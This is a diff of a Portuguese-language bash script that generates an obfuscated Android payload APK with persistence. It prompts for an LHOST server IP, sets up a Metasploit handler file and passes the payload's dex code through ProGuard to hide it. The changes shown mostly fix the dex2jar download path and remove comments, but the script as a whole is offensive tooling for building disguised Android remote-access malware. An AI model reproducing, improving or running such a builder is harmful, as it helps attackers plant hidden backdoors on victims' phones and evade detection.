@@ -9,12 +9,10 @@ fi
 
 echo "=== Gerador Automático de Payload Android com Persistência e Ofuscação ==="
 
-# Função para instalar dex2jar globalmente
 install_dex2jar_global() {
     if ! command -v d2j-dex2jar.sh &> /dev/null; then
         echo "[*] dex2jar não encontrado. Instalando globalmente em /usr/local/dex2jar..."
 
-        # Verifica se wget está instalado
         if ! command -v wget &> /dev/null; then
             echo "Erro: wget não está instalado. Instalando wget..."
             apt update && apt install -y wget
@@ -24,7 +22,6 @@ install_dex2jar_global() {
             fi
         fi
 
-        # Verifica se unzip está instalado
         if ! command -v unzip &> /dev/null; then
             echo "Erro: unzip não está instalado. Instalando unzip..."
             apt update && apt install -y unzip
@@ -36,7 +33,6 @@ install_dex2jar_global() {
 
         mkdir -p /usr/local/dex2jar
 
-        # Obtém a URL da última release do dex2jar no GitHub (redirecionamento)
         LATEST_RELEASE_URL=$(wget --server-response --max-redirect=0 --quiet https://github.com/pxb1988/dex2jar/releases/latest 2>&1 | grep "Location:" | awk '{print $2}' | tr -d '\r\n')
 
         if [ -z "$LATEST_RELEASE_URL" ]; then
@@ -44,18 +40,16 @@ install_dex2jar_global() {
             exit 1
         fi
 
-        # Extrai a tag da versão da URL (ex: v2.4)
         VERSION_TAG=$(basename "$LATEST_RELEASE_URL")
         if [[ ! "$VERSION_TAG" =~ ^v[0-9]+\.[0-9]+ ]]; then
             echo "Tag de versão inválida obtida: $VERSION_TAG. Abortando."
             exit 1
         fi
 
-        # Remove o 'v' para formar o nome do arquivo
         VERSION_NUMBER="${VERSION_TAG#v}"
 
-        # Monta a URL de download do zip
-        DEX2JAR_ZIP_URL="https://github.com/pxb1988/dex2jar/releases/download/${VERSION_TAG}/dex2jar-${VERSION_NUMBER}.zip"
+        # Link corrigido com nome oficial do arquivo
+        DEX2JAR_ZIP_URL="https://github.com/pxb1988/dex2jar/releases/download/${VERSION_TAG}/dex-tools-v${VERSION_NUMBER}.zip"
 
         echo "[*] Baixando dex2jar versão $VERSION_NUMBER de $DEX2JAR_ZIP_URL ..."
         wget --user-agent="Mozilla/5.0 (X11; Linux x86_64)" -q -O /tmp/dex2jar.zip "$DEX2JAR_ZIP_URL"
@@ -66,28 +60,26 @@ install_dex2jar_global() {
 
         unzip -q /tmp/dex2jar.zip -d /usr/local/dex2jar
         rm /tmp/dex2jar.zip
-        echo "[*] dex2jar instalado em /usr/local/dex2jar/dex2jar-${VERSION_NUMBER}"
+        echo "[*] dex2jar instalado em /usr/local/dex2jar/dex-tools-v${VERSION_NUMBER}"
 
     else
         echo "[*] dex2jar já instalado."
-        # Detecta versão instalada para PATH
         if [[ -d /usr/local/dex2jar ]]; then
-            VERSION_DIR=$(ls /usr/local/dex2jar | grep dex2jar- | head -n1)
+            VERSION_DIR=$(ls /usr/local/dex2jar | grep dex-tools-v | head -n1)
             if [ -n "$VERSION_DIR" ]; then
-                VERSION_NUMBER="${VERSION_DIR#dex2jar-}"
+                VERSION_NUMBER="${VERSION_DIR#dex-tools-v}"
             else
-                VERSION_NUMBER="2.4" # fallback
+                VERSION_NUMBER="2.4"
             fi
         else
-            VERSION_NUMBER="2.4" # fallback
+            VERSION_NUMBER="2.4"
         fi
     fi
 
-    export PATH="/usr/local/dex2jar/dex2jar-${VERSION_NUMBER}:$PATH"
+    export PATH="/usr/local/dex2jar/dex-tools-v${VERSION_NUMBER}:$PATH"
     echo "[*] PATH atualizado para incluir dex2jar."
 }
 
-# Função para instalar apktool
 install_apktool() {
     if ! command -v apktool &> /dev/null; then
         echo "[*] apktool não encontrado. Instalando..."
@@ -101,7 +93,6 @@ install_apktool() {
     fi
 }
 
-# Função para instalar ProGuard
 install_proguard() {
     if ! command -v proguard &> /dev/null; then
         echo "[*] ProGuard não encontrado. Instalando..."
@@ -115,7 +106,6 @@ install_proguard() {
     fi
 }
 
-# Função para verificar apksigner
 check_apksigner() {
     if ! command -v apksigner &> /dev/null; then
         echo "[*] apksigner não encontrado. Instalando..."
@@ -129,7 +119,6 @@ check_apksigner() {
     fi
 }
 
-# Função para gerar keystore se não existir
 generate_keystore() {
     if [ ! -f "$KEYSTORE" ]; then
         echo "[*] Keystore não encontrado. Gerando novo keystore..."
@@ -144,7 +133,6 @@ generate_keystore() {
     fi
 }
 
-# Função para criar arquivo ProGuard
 create_proguard_config() {
     cat > $PROGUARD_CONFIG <<EOF
 -dontoptimize
@@ -154,7 +142,6 @@ create_proguard_config() {
 EOF
 }
 
-# Solicita dados do usuário
 DEFAULT_LHOST=$(hostname -I | awk '{print $1}')
 read -p "Informe o LHOST (IP do servidor) [${DEFAULT_LHOST}]: " LHOST
 LHOST=${LHOST:-$DEFAULT_LHOST}
@@ -197,7 +184,6 @@ OUTPUT_APK="app_payload_obf.apk"
 PROGUARD_CONFIG="proguard.cfg"
 MSF_RC="handler.rc"
 
-# Instala dependências
 install_apktool
 install_proguard
 check_apksigner
@@ -282,8 +268,8 @@ echo "[*] Iniciando ofuscação com ProGuard..."
 mkdir -p temp_dex
 unzip -o $OUTPUT_APK classes.dex -d temp_dex
 
-DEX2JAR_BIN="/usr/local/dex2jar/dex2jar-${VERSION_NUMBER}/d2j-dex2jar.sh"
-JAR2DEX_BIN="/usr/local/dex2jar/dex2jar-${VERSION_NUMBER}/d2j-jar2dex.sh"
+DEX2JAR_BIN="/usr/local/dex2jar/dex-tools-v${VERSION_NUMBER}/d2j-dex2jar.sh"
+JAR2DEX_BIN="/usr/local/dex2jar/dex-tools-v${VERSION_NUMBER}/d2j-jar2dex.sh"
 
 if [ ! -x "$DEX2JAR_BIN" ] || [ ! -x "$JAR2DEX_BIN" ]; then
     echo "Erro: dex2jar scripts não encontrados ou não executáveis."
